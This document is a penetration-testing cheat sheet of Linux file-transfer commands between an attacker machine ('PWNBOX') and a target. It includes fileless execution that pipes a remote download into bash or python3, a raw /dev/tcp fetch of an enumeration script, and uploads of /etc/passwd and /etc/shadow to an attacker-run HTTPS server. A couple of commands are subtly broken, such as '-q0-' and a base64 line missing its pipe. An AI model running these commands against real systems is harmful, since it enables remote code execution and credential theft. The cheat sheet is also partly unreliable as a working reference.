-----------------
# Download Operations
---------------------------------------
### Base64 Encoding / Decoding
- PWNBOX 
```bash
# Check File MD5 hash
md5sum $file
# Encode the file
cat $file | base64 -w 0;echo
```

- TARGET
```bash
# Decode the file
echo -n $string base64 -d > $file
# Confirm the file MD5 hash
md5sum $file
```

### Web Downloads w/ wget & curl
- Download using wget
```bash
wget http://$IP/file -O $file
```
- Download using cURL
```bash
curl -o $file http://$IP/file
```

### Fileless Attacks Using Linux
- Fileless Download with cURL
```bash
curl http://$IP | bash
```
- Fileless Download with wget
```bash
wget -q0- http://$IP | python3
```

### Download with Bash (/dev/tcp)
- Connect to the TARGET webserver
```bash
exec 3<>/dev/tcp/$IP/80
```
- HTTP GET request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
# print the Response
cat <&3
```

### SSH Downloads
- Enable SSH Server
```bash
# Enable the service
sudo systemctl enable ssh
# Start the service
sudo systemctl start ssh
# Check for listening port
netstat -lnpt
```
- Download Files using SCP
```bash
scp $user@$IP:/root/file.txt .
```

-----------------------------------
# Upload Operations
---------------------------------------------
### Web Upload
- PWNBOX - Set up server
```bash 
# Install web server
python3 -m pip install --user uploadserver
# Create a self-signed Certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# The webserver should not host the certificate. It is recommended to create a new directory to host the file for our website
```
- PWNBOX - Start Web Server
```bash
mkdir https && cd https
python3 -m uploadserver 443 --server-certificate /root/server.pem
```

- TARGET -Upload multiple files
```bash
curl -X POST https://$IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# --insecure is used because we use a self-signed certificate that we trust.
```

### Alternateive Web File Transfer Method
- TARGET
```bash
# Python3
python3 -m http.server 8000
# PHP
php -S 0.0.0.0:8000
# Ruby
ruby -run -ehttpd . -p8000
```
- PWNBOX
```bash
wget $IP:8000/file.txt
```

### SCP Upload
- TARGET - File Upload using SCP
```bash
scp /etc/passwd $user@$IP:/home/file.txt/
```
